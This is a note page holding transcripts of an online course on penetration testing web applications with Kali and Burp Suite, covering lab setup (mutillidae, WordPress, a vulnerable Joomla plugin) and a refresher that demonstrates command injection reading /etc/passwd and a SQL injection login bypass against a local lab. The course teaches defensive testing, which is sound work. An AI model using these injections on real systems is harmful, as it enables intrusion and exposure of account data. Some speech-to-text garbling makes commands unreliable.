---
type: course
cssclasses:
  - lle-course
  - lle-level-advanced
slug: penetration-testing-web-apps-with-kali-and-burp-suite
url: "https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite"
duration_minutes: 114
duration: 1h 54m
level: Advanced
updated: 9/29/2022
learners: 31944
skills:
  - Penetration Testing
exercise_files: false
thumbnail: "https://media.licdn.com/dms/image/v2/C4E0DAQEkWyYAAMz_-A/learning-public-crop_675_1200/learning-public-crop_675_1200/0/1664314084893?e=2147483647&amp;v=beta&amp;t=PNGaWMiPQSNBxKI25IfN99PKNRUttTeopw1cxPrXQR0"
linkedin_topic: Cybersecurity
learning_paths:
  - '[[Become a Penetration Tester]]'
prev_courses:
  - '[[Kali Linux for Advanced Pen Testing and Ethical Hacking]]'
next_courses:
  - '[[Advanced Pen Testing Techniques for Active Directory]]'
path_nav: '[{"path":"Become a Penetration Tester","position":5,"total":8,"prev":"Kali Linux for Advanced Pen Testing and Ethical Hacking","next":"Advanced Pen Testing Techniques for Active Directory"}]'
path_count: 1
tags:
  - course
  - topic/security
  - skill/penetration-testing
status: not-started
created: 2026-05-03
---

> <!-- lle:github-source --> [View this note on GitHub](https://github.com/thisis-romar/linkedin-learning-vault/blob/github-browse/Courses/Cybersecurity/Penetration%20Testing%20Web%20Apps%20with%20Kali%20and%20Burp%20Suite.md)

![Penetration Testing Web Apps with Kali and Burp Suite](https://media.licdn.com/dms/image/v2/C4E0DAQEkWyYAAMz_-A/learning-public-crop_675_1200/learning-public-crop_675_1200/0/1664314084893?e=2147483647&amp;v=beta&amp;t=PNGaWMiPQSNBxKI25IfN99PKNRUttTeopw1cxPrXQR0)

# Penetration Testing Web Apps with Kali and Burp Suite

> Websites are one of the most vulnerable pieces of information technology, since their contents are exposed to access from the internet. By understanding how attackers locate and exploit these vulnerabilities, you can help build more secure websites and protect web applications. This course shows you how to perform advanced web testing using the tools available in Kali, the professional pen testing

> [LinkedIn Learning](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite) | 1h 54m | Advanced | 32K learners
> [Jump to Path Context ↓](#path-context)

## Table of Contents

### Chapter Overview

- [**Introduction**](#introduction) (3 videos)
  - [Protecting your websites](#protecting-your-websites)
  - [What you should know before watching this course](#what-you-should-know-before-watching-this-course)
  - [Disclaimer](#disclaimer)
- [**1. Setting Up**](#1-setting-up) (4 videos)
  - [Preparing the test environment](#preparing-the-test-environment)
  - [Setting up WordPress](#setting-up-wordpress)
  - [Setting up Joomla](#setting-up-joomla)
  - [Online testing sites](#online-testing-sites)
- [**2. Refresher**](#2-refresher) (3 videos)
  - [A refresher on web technology](#a-refresher-on-web-technology)
  - [Refreshing your basic web testing skills](#refreshing-your-basic-web-testing-skills)
  - [A refresher on website shell implants](#a-refresher-on-website-shell-implants)
- [**3. Advanced Website Enumeration**](#3-advanced-website-enumeration) (3 videos)
  - [Busting open a website](#busting-open-a-website)
  - [Identifying virtual websites](#identifying-virtual-websites)
  - [More ways to find web pages](#more-ways-to-find-web-pages)
- [**4. Finding Vulnerabilities**](#4-finding-vulnerabilities) (2 videos)
  - [Vulnerability scanning with Burp Suite](#vulnerability-scanning-with-burp-suite)
  - [Using sqlmap to validate SQL injections](#using-sqlmap-to-validate-sql-injections)
- [**5. Attacking the Website**](#5-attacking-the-website) (9 videos)
  - [Exploiting your way into the gym](#exploiting-your-way-into-the-gym)
  - [Exploiting through an ASPX shell with Cadaver](#exploiting-through-an-aspx-shell-with-cadaver)
  - [Checking web page source](#checking-web-page-source)
  - [Injecting HTML into a web page](#injecting-html-into-a-web-page)
  - [Exploiting tools left on websites](#exploiting-tools-left-on-websites)
  - [Injecting SQL using Burp Suite](#injecting-sql-using-burp-suite)
  - [Exploiting Node.js](#exploiting-nodejs)
  - [Injecting XML into a web page](#injecting-xml-into-a-web-page)
  - [File access through a web application URL](#file-access-through-a-web-application-url)
- [**6. Content Management**](#6-content-management) (4 videos)
  - [Understanding CMS targets](#understanding-cms-targets)
  - [Getting into WordPress](#getting-into-wordpress)
  - [Shelling through WordPress](#shelling-through-wordpress)
  - [Exploiting Joomla via SQL](#exploiting-joomla-via-sql)
- [**Conclusion**](#conclusion) (1 videos)
  - [What's next](#whats-next)

### Introduction

[↑ Back to Table of Contents](#table-of-contents)

#### [Protecting your websites](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/protecting-your-websites?u=76281980&t=0)** - [Malcolm Shore] With the dominance of Cloud and [[SaaS|software as a service]] delivery, web portals are now the standard means of accessing applications. These applications might be static [[HTML]] servers, serving up information that changes only when the website is updated. They may be active servers running one or more of many different active languages. They may be [[Content Management Systems (CMS)|content management systems]] providing easily scripted web content through one of a number of CMS solutions. I'm Malcolm Shore and I've spent a career helping governments and businesses protect their networks and systems against cyber attacks. In this course, we'll be using a variety of advanced web tools and technologies. We'll start by looking at the tools that we can use to enumerate the web platform. We'll see how we can gain access to information on the server and in its backend [[Databases]]. And how to achieve command shells to take control of the web server. Once you complete the course, you'll be armed with the knowledge and exploit techniques needed as a professional web pen tester. Now, let's get started with advanced web testing.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[HTML]] (1), [[Content Management Systems (CMS)|Content management systems]] (1), [[Databases]] (1)
> **Env Vars:** html (1), cms (1)
> **Speakers:** - [malcolm (1)

#### [What you should know before watching this course](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/what-you-should-know-before-watching-this-course?u=76281980&t=0)** - [Instructor] This is a practical course. And during this course, we'll be using the [[Kali Linux]]-based tools to do testing. We'll be testing against web applications in the offensive security and Hack The Box online [[Penetration Testing]] labs. Together, these provide a range of sophisticated web-based applications for us to test. Where possible, we'll use the free subscription targets in these labs, but some of the more complex targets will be in the main labs. We'll also be using the [[OWASP]] Utility Dive Vulnerable Web Application, which we can run on our local test network. You should be competent in [[Windows]] and Unix host technologies, as well as having a good grasp of network protocols. A good understanding of HTTP would be an advantage. You'll need to have a good working knowledge of Kali and some hands-on experience of testing. You should have a working knowledge of web testing tools, in particular, [[Burp Suite]], and you should have taken the [[Ethical Hacking]]: [[Web Servers]] and Applications course. You should have a basic knowledge of scripting languages, such as [[PHP]] and [[Python (Programming Language)|Python]]. You should be able to install third-party tools and applications that we'll use in our testing.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Kali Linux]] (1), [[Penetration Testing]] (1), [[OWASP]] (1), [[Windows]] (1), [[Burp Suite]] (1)
> **Env Vars:** owasp (1), http (1), php (1)
> **CLI Commands:** php (1), python (1)
> **Prerequisites:** you'll need (1), install (1)
> **Definitions:** is a  (1)
> **Analogies:** such as (1)
> **Speakers:** - [instructor] (1)

#### [Disclaimer](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/disclaimer?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/disclaimer?u=76281980&t=0)** - [Instructor] This is one of a series of advanced pen testing courses. And in addition to [[Kali Linux]], it uses some third-party commercial and open-source testing software. While we've done our best to ensure that the tools we use and the sites we reference are legitimate, testing sites can be targets for hackers and we can't provide any assurance that these sites might not be compromised when you visit them. Some of the sites which store the testing tools are detected as dangerous because the tools have similar signatures to malware and may raise antivirus alerts when you visit them. The testing tools we demonstrate are extremely powerful. They may demonstrate some of the same signature characteristics as malware and malicious implants, and may raise antivirus alerts when you try to download them. Again, we can't provide assurance that the software hasn't been compromised when you download it. And so, as for any other software from the internet, you need to exercise due diligence and take personal responsibility for anything you load into your system. Our testing is mostly carried out inside a virtual environment to contain any unplanned effects of testing tools and in the unlikely event that you download malware, this will also help contain any impact.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Kali Linux]] (1)
> **Speakers:** - [instructor] (1)


### 1. Setting Up

[↑ Back to Table of Contents](#table-of-contents)

#### [Preparing the test environment](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=0)** - [Instructor] During this course we'll be using a number of web applications. Some of these will be available in the Offensive Security and Hack The Box online testing labs. But some of them we'll have running locally on our own test network. We can run a physical server on our home network. We can set up a virtual machine in a Virtual Box or VMware environment. Or we can run a VM on a home data center solution, such as Proxmox. It makes no difference which environment we run our [[Virtual Machines]] in. So it's personal choice. We'll be using the Metasploitable system that we used in our web systems and web applications course for our refresher on web testing. This offers a number of web targets. Including an early version of mutillidae. There's a more recent version of mutillidae which we can load and use. It runs on a LAMP Stack web server, MariaDB, Apache, and [[PHP]] on top of [[Linux]]. I've prepared a standard LAMP Stack server. So let's install mutillidae II. The first thing we need to do is set up an account for mutillidae. We can do this easily enough. Let's SSH into our LAMP server. SSH and I'll use the account [[Ubuntu]]@192.168.1.176.
>
> **[1:25](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=85)** That's my lamp server. And let's open [[SQL]]. Sudo [[MySQL]] minus U, route. And we'll set up the account we'll use from mutillidae. Create user mutillidae@localhost
>
> **[1:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=114)** identified by the password mutillidae. And we'll grant all privileges on star-dot-star to mutillidae@local host.
>
> **[2:20](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=140)** And we'll flush privileges and exit.
>
> **[2:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=149)** Now let's clone the mutillidae application. CD/var/www/[[HTML]]. Sudo [[Git]] clone [https://github.com/webpwnized/mutillidae.git](https://github.com/webpwnized/mutillidae.git)
>
> **[2:57](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=177)** and we'll update the account details. CD mutillidae/includes and sudo nano database-config.inc.
>
> **[3:15](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=195)** And we'll change the username to mutillidae. Okay, that's it. So we can leave the server now and we can browse to mutillidae. 192.168.1.176/mutillidae
>
> **[3:39](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/preparing-the-test-environment?u=76281980&t=219)** and we'll select click here to set up the database. Okay, we've now set up mutillidae and we've got a server we can test against. We'll add additional web applications to this server as we progress through the course.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Git]] (2), [[Virtual Machines]] (1), [[PHP]] (1), [[Linux]] (1), [[Ubuntu]] (1)
> **CLI Commands:** sudo (3), ssh (2), cd (2), git (2), apache (1)
> **Env Vars:** lamp (3), ssh (2), php (1), sql (1)
> **Prerequisites:** set up (5), install (1)
> **Versions:** 192.168.1 (2)
> **URLs:** [https://github.com/webpwnized/mutillidae.git](https://github.com/webpwnized/mutillidae.git) (1)
> **Tools:** github (1)
> **Analogies:** such as (1)

#### [Setting up WordPress](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=0)** - In order to support our testing of [[Content Management Systems (CMS)|content management systems]], we'll set up the [[WordPress]] CMS on our lamp server. I've SSHD into it. So let's get started. The first thing we'll do is to go into my [[SQL]] and add the WordPress [[Databases]], sudo my SQL minus U route, and will create database WordPress. Let's also add an administrator account that we can use for CMS support. Create user support at local host identified by support grant all privileges on Startup Star to support at Local host and we can flush privileges and exit. So let's load WordPress now. We can use curl to download it into our temp folder For the moment CD slash TMP, curl minus o https
>
> **[1:36](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=96)** [wordpress.org](https://wordpress.org), latest dot tar dot g said And we'll use tar to un zip it. Tar xzvf latest dot tar dot gz. We need to set up the configuration file for WordPress. We'll start by downloading the official salt value curl https api.[wordpress.org](https://wordpress.org).
>
> **[2:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=136)** Secret key 1.1 salt two WordPress slash WP dash config dot [[PHP]]. And then we'll add to it the [[Representational State Transfer (REST)|rest]] of the PHP file nano WordPress slash WP dash config dot php. We'll add the PHP header at the start php and at the end we'll add the remaining PHP configuration lines. Define DB underscore name WordPress define DB underscore user support define DB underscore password support define DB underscore host local host
>
> **[3:53](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=233)** define DB underscore charset. UTF8 Define DB collate. Well leave that blank. Define FS method Direct. Define WP de Bug false, and we'll set the table prefix to WP underscore. And if not defined, ABSPATH. Define ABSPATH underscore underscore dir dot backslash and require once
>
> **[5:28](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=328)** ABSPATH WP Settings dot php. And close the PHP file and save it. Now let's move this into the web home folder. sudo move WordPress to slash war slash www slash [[HTML]] slash WordPress and we'll set up the ownership and permissions sudo chown www data. Www data sudo chown minus R WW data WW data slash war slash www slash html slash WordPress and sudo chard minus R 7 55 slash war slash www slash html slash WordPress. The final change we need to make is to increase the maximum upload size in PHP from two meg to eight meg nano slash etcetera
>
> **[7:01](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=421)** sudo nano slash etcetera slash php slash 7.4 slash apache two slash php dot ini. And well look for two M and change that to eight. Okay, let's finish the installation of WordPress by browsing to the home folder. We'll keep with English and we'll use Cybex as the site title and set the username and password to admin.
>
> **[7:54](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-wordpress?u=76281980&t=474)** And we'll set the email to admin@[cybex.com](https://cybex.com) and we can now install WordPress.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[WordPress]] (16), [[PHP]] (11), [[HTML]] (3), [[SQL]] (2), [[Content Management]] (1)
> **CLI Commands:** php (11), sudo (6), tar (4), curl (3), chown (2)
> **Env Vars:** php (5), abspath (3), cms (2), sql (2), sshd (1)
> **URLs:** [wordpress.org](https://wordpress.org) (2), [cybex.com](https://cybex.com) (1)
> **Prerequisites:** set up (2), install (1)
> **Versions:** 1.1 (1), 7.4 (1)
> **Speakers:** - in (1)

#### [Setting up Joomla](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=0)** - Let's install Joomla as a second [[Content Management]] system that we can test. I'm logged into our local server, so we'll start our setup of Joomla by adding its database to [[MySQL]]. "sudo mysql -u root" And we'll "create database joomla_db;"
>
> **[0:29](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=29)** and "exit". Let's download Joomla into the tmp folder. So we'll "cd /tmp" and "wget [https://downloads.joomla.org](https://downloads.joomla.org)/
>
> **[0:51](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=51)** cms/ joomla3/ 3-5-0/ Joomla_3.5.0-Stable-Full_Package.zip"
>
> **[1:16](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=76)** and we'll output that to just joomla.zip. Okay, let's make a webroot folder and we'll unzip into it. "sudo mkdir /var/www/[[HTML]]/joomla",
>
> **[1:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=100)** and "sudo unzip joomla.zip -d"
>
> **[1:48](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=108)** and destination folder will be "/var/www/html/joomla".
>
> **[1:58](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=118)** And we'll set the ownership to the web account: "sudo chown" recursively, "www-data:www-data/var/ www/html/joomla". Okay, Joomla's now ready to be set up via its web interface. We'll browse to the Joomla homepage, 192.168.1.176/joomla.
>
> **[2:38](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=158)** We'll set the site name to "Cybex" and the Administrator Email to "admin@[cybex.com](https://cybex.com)". We'll use admin as the administration account and set the password to admin as well. And we can click Next. We'll set the database username to "support", as we've set up previously, and the database name, as we've set up, to "joomla_db". And we'll put "jm_" as the table prefix. Okay, we can now install, and we can finish by removing the installation folder. Joomla allows us to load plugin applications. One such application is "jssupportticket". A number of bugs have been found in jssupportticket. Let's go into Joomla and we'll upload a vulnerable version of the jssupportticket plugin. I've already downloaded this onto the server, so we can upload it directly. Let's log in with our admin credentials: "admin", "admin". And we'll select "Extensions" and we'll browse to jsticket.zip.
>
> **[4:23](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=263)** And we'll upload and install. We'll go to Menus, Manage and we'll add a new menu. And we'll call it "Support Tickets". Menu type is "Application", and the Description, we'll put as "Support Tickets". And in Support Tickets, we'll add the three jssupport jobs as menu items.
>
> **[5:03](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/setting-up-joomla?u=76281980&t=303)** JS Support Ticket control panel, and we'll call that "Control". And select JS Support Ticket, "My Tickets", and we'll select "Open Tickets", and save. And finally, we can publish them. That's all for now, and we'll come back to Joomla later.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[HTML]] (3), [[MySQL]] (2), [[Content Management]] (1)
> **CLI Commands:** sudo (4), mysql (2), unzip (2), cd (1), wget (1)
> **Prerequisites:** install (3), set up (3), setup (1)
> **Code Identifiers:** joomla_db (2)
> **URLs:** [https://downloads.joomla.org](https://downloads.joomla.org) (1), [cybex.com](https://cybex.com) (1)
> **Versions:** 5.0 (1), 192.168.1 (1)
> **UI Navigation:** go to (1)
> **Speakers:** - let (1)

#### [Online testing sites](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=0)** - [Malcolm] Offensive security provides a set of freely accessible machines in their [[Penetration Testing]] playground, and this is the first of two online testing sites we'll use during the course. We'll be using the free play tier, Proving Ground. Once we signed up, we can log into PG Play. Here we can see the list of available machines that we can use in the Play Lab. To do testing, we can either use My Kali, which is an online Kali instance or we can download a VPN pack in order to use our own testing environment. If we hover over a target, we can see more details, and we can start it using the run button at the right. At the top, we have Lampiao, and if we hover over it we can see that it's an intermediate difficulty target and we'll be looking for Proof Doc text. Before we start it, we'll click on My Kali, and this will open a Kali instance in a new web tab. This takes a few seconds to load up and then we're ready to go. We can now start Lampiao. The IP address of Lampiao is now displayed. In our Kali instance, we can use Firefox and we can go to 192.168.55.48 and we see the website displayed. We'll stop this and leave offensive security for now, but we'll come back to this lab later in the course.
>
> **[1:35](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/online-testing-sites?u=76281980&t=95)** Another penetration testing lab we'll be using for our advanced web testing is the [[HackTheBox|hack-the-box]] lab. To follow along using the more advanced systems we'll be looking at will require a paid subscription however. I've logged into the portal, and we can select labs, machines. This provides access to a range of active machines and retired machines. If we check the support target at the top of the list, we get the option to join this live machine. When we click on that, we see its IP address. To connect to it, we can check connect to [[HackTheBox|HTB]], machines, and then either download a VPN pack to use our own testing environment or use the online parrot based test environment. We'll come back to both of these labs as we proceed through the course. We're now ready to start testing. If you feel that you're up to speed on web technology and testing, you can skip the refresher section and go straight to the advanced web material.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Penetration Testing]] (2), [[HackTheBox|Hack-the-box]] (1), [[HackTheBox|Htb]] (1)
> **Env Vars:** vpn (2), htb (1)
> **UI Navigation:** click on (2)
> **Versions:** 192.168.55 (1)
> **Cross-References:** later in (1)
> **Tools:** firefox (1)
> **Definitions:** is an  (1)
> **Prerequisites:** before we start (1)


### 2. Refresher

[↑ Back to Table of Contents](#table-of-contents)

#### [A refresher on web technology](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=0)** - [Narrator] Websites are the main conduit for computer-based information and browsers are now the preferred interface used to access application systems. There are many [[Forms]] of websites and to be a web application tester, we need to have a good working knowledge, not only of the underlying protocols used for web access, but also the structure of websites. I introduced the basics of website testing in my [[Ethical Hacking]] course on hacking [[Web Servers]] and web applications. Let's just refresh ourselves on what we learned about how websites are presented. A web application is built using [[HTML]] and script code, running on a web server that offers an HTTP or HTTPS protocol access, the more recent WS and WSS web socket protocols or the experimental QUIC protocol. It will likely use a backend database server or some form of flat file for content. A user will connect to the application from a browser which may be running on a desktop, a laptop, or a mobile device. The web application may want to authenticate the user. And to do that, use some form of backend authentication system such as LDAP. It's good practice to not expose a web application server directly to the internet and so a web proxy will be placed between the user and the web application. The proxy server takes user requests
>
> **[1:35](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=95)** and sends them to the web application and takes web application responses and returns them to the user. A web proxy is designed to be secure and is a much safer internet-facing system than a full web server. Early web applications tended to be mainly written on the server side, with forms being used to request data. Nowadays, much of the code is client-side, often supported with client-side data stores. While [[Content Management Systems (CMS)|content management systems]] have a standardized web folder structure, the folder structures for custom-built web applications will be application-specific. Also, individual web servers have their own default folder structure. This may be changed for production, but understanding what a default website would look like for each type of server is a good start. A website exists as folders on a host with the homepage of the website on a typical [[Linux]] Apache installation being located at /var/www/html. And on a typical [[Windows]] installation of IIS being in /inetpub/wwwroot. The hypertext markup language, HTML, is the basic building block of a website. A simple webpage might just start with an HTML tag as shown here. More usually, a webpage starts with a declaration that the page is indeed HTML written as DOCTYPE html. After that, the basic component of a webpage
>
> **[3:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=190)** is a set of elements in between the start and end markers shown as a name bracketed with less than and greater than symbols. The start marker may additionally have attributes in between the open and closed brackets. The element start is sometimes known as a tag and there are a number of standard ones, such as title, the H tag for headers, body, and the P tag for paragraph. Another useful tag is the href tag, which enables a webpage to reference another page through a hyperlink. Web designers have gone much further with the way in which webpages are crafted in order to ensure a consistent application of styles. We can use the style element for a page or for the whole website. This can be included in the page or more usually in its own file external to the HTML file. The full external styling approach is known as [[Cascading Style Sheets (CSS)|cascading style sheets]]. We'll also see tables and forms appearing in many web pages, particularly those that we're interested in as a tester. We need to understand how the forms pass data to be validated and processed as this can be an area of weakness in some sites. Forms have their own form tag and are constructed with various elements to enable data input and often have the div elements which define areas of the page. There are also XML, [[PHP]], and [[JavaScript]] tags which allow active code to be included in web pages.
>
> **[4:46](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=286)** Here's an example of a call to an external JavaScript file and an embedded line of JavaScript code. One of the important elements of messages exchanged from a PHP-driven website is the PHP session ID. And this is something we'll use during our testing to enable us to work inside PHP sessions. We'll be seeing more of active code as we progress through the course. Finally, in addition to understanding what the target looks like and how it's built from a static perspective, the web application tester also needs to be knowledgeable in the message protocols used by the application when it's operating and particularly the two common protocols, HTTP and HTTPS. HTTP is a stateless client server protocol which can be used from a browser or programmatically between hosts. An http:// URL will establish a TCP connection on port 80 as we can see here. And https:// will establish a connection by default on port 43. HTTPS will be used to set up a protected data transfer using TLS packets. It's not unusual to see a web server set up on a different port such as 8080. An HTTP exchange consists of an HTTP request message, which is sent to the web server, and an HTTP response message, which is returned.
>
> **[6:22](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=382)** In an interactive session, the HTTP response will provide data for the user which needs to be displayed, i.e., an HTML webpage. We can see the selected response packets in the bottom panel as a zipped text HTML page. GET is one of eight standard request commands or methods defined in HTTP. The GET command allows a user to download a web resource from the server. This will often be a webpage specified by a file name. Omitting the file name will cause the default first page to be returned. The HEAD request is used in the same way as GET, but will download just the header or [[Metadata]]. This is commonly done to check the last modified data of the page and check against a local-cached copy. The POST command allows a user to upload items to the server. This is commonly used to send form data back to the server and is the key message that's of interest to pen testers. The TRACE command requests a diagnostic trace of the actions taken by the server. The OPTIONS command asks the server to return the list of request methods it supports. The CONNECT command causes the proxy to connect to another host. This is often used to make an SSL connection through the proxy. Two important commands when doing web application testing are the PUT command to send data to the server to be stored and the DELETE command to delete data. These are often not used in production systems
>
> **[7:55](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-web-technology?u=76281980&t=475)** for security reasons, but if they do exist, then we can likely take advantage of them. There are seven common status codes. 200 indicates that the request was processed without any problems. 301 means redirection for pages that have been moved. 400 is a bad request. 401 is unauthorized. 403 means access is forbidden. And the commonly seen 404 means that it's an unknown page. 500 is an internal server error. While websites often use just a few header fields, there are many that have been defined in the HTTP standard. The webpage shown here is an excellent quick reference for all the HTTP header fields that you might come across during testing.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[HTML]] (9), [[Forms]] (5), [[PHP]] (4), [[JavaScript]] (3), [[Web Servers]] (2)
> **Env Vars:** http (10), html (7), php (4), https (3), wss (1)
> **Definitions:** is a  (5), known as (2), is an  (2), means that (1)
> **API Endpoints:** get  (2), head  (1), post  (1), options  (1), put  (1)
> **CLI Commands:** php (4), apache (1), make (1)
> **Analogies:** such as (3)
> **Ports:** port 80 (1), port 43 (1)
> **Prerequisites:** set up (2)

#### [Refreshing your basic web testing skills](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=0)** - [Instructor] In my Hacking [[Web Servers]] and Web Applications course. We not only learned about web technology, but also about web testing tools and techniques. We covered the two main ways of testing web applications. The first is to scan the web pages or application screens, looking for vulnerabilities. And the second is proxying traffic in order to manipulate the messages being passed to and from the application. We'll be using both. We also covered ways to hijack sessions with cookies and methods of manipulating URL parameters. Let's do a quick refresher of some of the tools and techniques we covered in the course. We can do basic profiling by using a tool called whatweb. Let's use this to profile mutillidae. Whatweb http:// 192.168.1.176/ mutillidae. This shows two sets of output, the first being the web server with a redirect and the second, the redirected site. The basic web server details such as the version of Apache are the same, of course. The [[Nikto]] tool provides a basic level of vulnerability analysis. And we can also run this against mutillidae. Nikto -h [http://192.168.1.176/mutillidae](http://192.168.1.176/mutillidae).
>
> **[1:35](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=95)** Here we get the same basic server information, the [[Linux]] and Apache versions, but we also get a long list of possible vulnerabilities with their reference in the open source, vulnerability database. We might carry out an automated scan of a website using the [[OWASP]] ZAP tool. We can select automated scan and enter the URL, which is 192.168.1.176/mutillidae,
>
> **[2:10](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=130)** and press attack. And we can see the pages being scanned as well as the external pages, which are shown with red markers and are skipped. If we check the Alerts tab, we can see the potential vulnerabilities, which zap has identified. Injection of code is a significant attack technique, whether we do it via the URL or in a form. Let's refresh ourselves on how to do command injection. Here, we are expected to enter a message to be echoed back. So we'll enter Hello World. And what we get is what we expect. However, we can add an additional command onto the end of the message. Hello world .cat/etc/passwd. And here we get not only our message, but also a listing of all accounts on the system. [[SQL]] injection is another common injection attack, which we can see in mutillidae. Here we have a log on page, so let's try to log in as admin. Admin. And for the password, we'll enter, "or1=1#.
>
> **[3:40](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/refreshing-your-basic-web-testing-skills?u=76281980&t=220)** And log in. And we're in as admin and we've bypassed the nikto authenticate. That's been a succinct refresher of our basic knowledge of web testing with a couple of examples. And it provides the foundation for building out our web testing skills with some advanced techniques.

> [!info]- Semantic Content
>
> **Frameworks & Libraries:** [[Nikto]] (3), [[Web Servers]] (1), [[Linux]] (1), [[OWASP]] (1), [[SQL]] (1)
> **Env Vars:** url (3), owasp (1), zap (1), sql (1)
> **CLI Commands:** apache (2), cat (1)
> **Versions:** 192.168.1 (3)
> **Cross-References:** we covered (2)
> **URLs:** [http://192.168.1.176/mutillidae](http://192.168.1.176/mutillidae) (1)
> **Definitions:** is a  (1)
> **Analogies:** such as (1)

#### [A refresher on website shell implants](https://www.linkedin.com/learning/penetration-testing-web-apps-with-kali-and-burp-suite/a-refresher-on-website-shell-implants?u=76281980)

> [!transcript]- Transcript
>
